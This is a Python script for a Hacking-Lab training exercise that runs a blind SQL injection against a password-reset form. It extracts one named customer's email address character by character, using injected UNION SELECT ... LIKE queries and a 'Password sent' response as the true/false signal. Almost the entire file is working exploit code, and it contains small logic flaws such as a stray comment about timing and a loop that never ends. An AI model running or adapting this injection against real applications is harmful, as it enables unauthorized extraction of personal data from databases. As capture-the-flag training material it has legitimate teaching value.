import urllib
import time
import re

#A few globals for use throughout
url = 'https://glocken.hacking-lab.com/12001/blindsql_case0/auth_blindsql0/register?action=newPassword&originalURL=null&' 
success = 0
fail = 0
#Franziska Knobel

#Take the current attack string 
def do_attack(current_string):
	global success, fail, url
	current_string = urllib.urlencode(current_string)
	tmp_url = url + current_string

	f = urllib.urlopen(tmp_url)
	resp = f.read()
	f.close()

	x = re.findall("Password sent", resp)	
	if(len(x) > 0):
		print x[0]
		
	#we test if the time taken is longer than the time it took for a known fail
	if(len(x) > 0):
		return True
	else:
		return False

def main():
	global success, fail, url

	alphabet = "abcdefghijklmnopqrstuvwxyz0123456789.@"
	final_email = ''
	current_email = 'a' 

	
	alpha_index = 0
	index = 0
	while True:
		tmp = current_email
		tmp += '%'

		current_attack = {"username": "' union select surname from glocken_emil.customers where name = 'Franziska' and surname = 'Knobel' and email like '%s'\x23" %tmp}
		print "[+] Current email is: %s [+]" %final_email
		print "[Debug] %s" %current_attack["username"]		

		if(do_attack(current_attack)):
			print "[debug] Found new value %s" %alphabet[alpha_index]
			final_email += alphabet[alpha_index]
			alpha_index = (alpha_index + 1) %len(alphabet)
			current_email = final_email + alphabet[alpha_index]
		else:
			alpha_index = (alpha_index + 1) % len(alphabet)
			current_email = final_email +  alphabet[alpha_index]
	
if __name__ == '__main__':
	main()
